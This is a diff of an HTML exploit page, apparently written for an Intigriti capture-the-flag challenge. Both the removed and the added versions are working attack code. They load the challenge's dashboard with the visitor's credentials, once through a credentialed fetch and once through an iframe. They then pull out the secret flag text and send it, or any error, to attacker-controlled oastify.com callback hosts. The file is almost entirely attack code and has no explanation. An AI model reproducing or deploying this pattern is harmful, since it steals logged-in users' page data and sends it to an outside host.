@@ -1,23 +1,27 @@
 <!DOCTYPE html>
 <html>
 <body>
+
+<iframe id="frame" src="https://challenge-0126.intigriti.io/dashboard.html"></iframe>
+
 <script>
-fetch("https://challenge-0126.intigriti.io/dashboard.html", {
-  credentials: "include"
-})
-.then(r => r.text())
-.then(html => {
+setTimeout(() => {
 
-  // flag text extract karo
-  const match = html.match(/INTIGRITI\{.*?\}/);
+  try {
 
-  if(match){
-    fetch("https://6t0zvf2if3ckvsh6npwccqm4nvtmhp5e.oastify.com/?flag=" + encodeURIComponent(match[0]));
-  } else {
-    fetch("https://6t0zvf2if3ckvsh6npwccqm4nvtmhp5e.oastify.com/?noflag=true");
+    let frame = document.getElementById("frame");
+    let flagText = frame.contentDocument.getElementById("flagText").innerText;
+
+    fetch("https://547y6edhq2nj6rs5yo7bnpx3yu4lscj08.oastify.com/?flag=" + encodeURIComponent(flagText));
+
+  } catch(e) {
+
+    fetch("https://547y6edhq2nj6rs5yo7bnpx3yu4lscj08.oastify.com/?error=" + e);
+
   }
 
-});
+}, 5000);
 </script>
+
 </body>
 </html>
